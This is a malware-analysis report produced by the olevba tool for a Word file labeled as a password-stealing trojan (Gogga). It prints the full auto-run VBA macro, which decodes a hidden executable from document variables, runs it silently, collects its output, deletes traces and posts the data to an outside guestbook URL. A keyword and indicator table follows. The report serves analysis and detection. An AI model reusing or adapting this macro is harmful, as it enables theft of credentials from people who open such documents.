olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-PSW.MSWord.Gogga.a-357196152cb1210f100481c7d5d6e55a1a2ef284
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-PSW.MSWord.Gogga.a-357196152cb1210f100481c7d5d6e55a1a2ef284 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function decoding(sym As String) As Byte
decoding = (Asc(Mid$(sym, 1, 1)) - 65) * 16 + (Asc(Mid$(sym, 2, 1)) - 65)
End Function
Public Sub autoopen()
Dim bt As Byte, i As Long, str As String, strt As Single
Dim PostData() As Byte, fn As Integer, ie As Object
On Error Resume Next
str = ActiveDocument.Variables(1)
fn = FreeFile
Open "c:\s.exe" For Binary Access Write As #fn
For i = 1 To 38912 Step 2
bt = decoding(Mid$(str, i, 2))
Put #fn, , bt
Next i
Close #fn
Open "c:\s.bat" For Output As #fn
Print #fn, "c:\s.exe >c:\s.bmp"
Close #fn
Shell "c:\s.bat", vbHide
strt = Timer
Do While Timer < strt + 5
    DoEvents
Loop
msg = ""
Open "c:\s.bmp" For Input As #fn
Do
str = Input(1, #fn)
msg = msg & IIf(str = "&" Or str = "=", "#", str)
Loop Until EOF(fn)
Close #fn
Kill "c:\s.*"
PostData = "master=99sau&job=add&username=goga&comments=" & msg
PostData = StrConv(PostData, vbFromUnicode)
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "http://www.gb.ru/cgi-bin/guestbook/gb.cgi", 0, "", _
PostData, "Content-Type: application/x-www-form-urlencoded" & vbCrLf
Do
DoEvents
Loop While True
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.gb.ru/cgi|URL                                          |
|          |-                   |                                             |
|          |bin/guestbook/gb.cgi|                                             |
|IOC       |s.exe               |Executable file name                         |
|IOC       |s.bat               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

